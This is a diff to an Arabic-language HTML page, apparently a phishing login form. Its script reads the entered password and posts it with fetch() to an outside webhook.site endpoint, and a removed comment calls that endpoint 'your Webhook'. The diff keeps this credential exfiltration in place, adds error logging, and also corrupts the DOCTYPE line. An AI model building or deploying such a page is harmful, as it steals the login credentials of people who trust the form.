@@ -1,6 +1,4 @@
-
-
-<!DOCTYPE html>
+!DOCTYPE html>
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
@@ -69,7 +67,7 @@
             const password = e.target.password.value;
 
             // إرسال البيانات إلى Webhook الخاص بك
-            fetch('https://webhook.site/d35f0a15-b44c-433c-a4dc-217e3f44a947', {  // هذا هو عنوان Webhook الخاص بك
+            fetch('https://webhook.site/d35f0a15-b44c-433c-a4dc-217e3f44a947', {
                 method: 'POST',
                 headers: {
                     'Accept': 'application/json',
@@ -86,6 +84,7 @@
             })
             .catch(error => {
                 document.getElementById('responseMessage').innerText = 'حدث خطأ في الاتصال!';
+                console.error('خطأ في الاتصال:', error);
             });
         });
     </script>
